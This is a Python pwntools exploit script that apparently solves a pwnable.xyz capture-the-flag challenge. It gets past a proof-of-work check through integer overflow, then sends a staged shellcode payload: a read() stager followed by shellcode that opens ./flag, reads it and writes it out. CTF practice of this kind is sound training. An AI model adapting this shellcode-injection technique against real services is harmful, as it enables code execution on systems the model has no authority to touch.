from pwn import *

context.arch = 'amd64'

###Exploit
while True:
    try:
        r = remote('svc.pwnable.xyz',30028)
        ###0 is forbidden here, so try to let a*b = x*0x100000000
        ###Not sure if there is a 100% successful way, but 1/2 chance is good enough
        POW = int(r.recvline()[:-1].split(b'0x')[-1],16)
        if POW%2==1:
                exit()
        r.sendlineafter('> ',str((0x80000000+POW)%0x100000000)+' '+str(0x80000000))

        ###This stub is to stop shellcode from being xored
        ###Since rdx is the mmapped address, the stub is gaurenteed to work and won't trigger errors
        stub = b'\x00\x02'  #add    BYTE PTR [rdx],al
        ###Read further shellcode
        shellcode = asm('''
                        xor rax,rax
                        push rdx
                        pop rsi
                        mov edx,0x100
                        syscall
                        ''')

        payload = (stub+shellcode).ljust(0x10,b'\x90')
        r.sendafter('Input: ',payload)

        ###shellcraft.sh() doesn't work remotely for some reason, I wonder what it is...
        padding = b'\x90'*0x10
        shellcode = asm(shellcraft.pushstr('./flag\x00')+shellcraft.open('rsp',0,0)+shellcraft.read('rax','rsp',0x70)+shellcraft.write(1,'rsp',0x70))
        payload = padding+shellcode
        r.send(payload)
        r.interactive()
        break
    except:
        r.close()
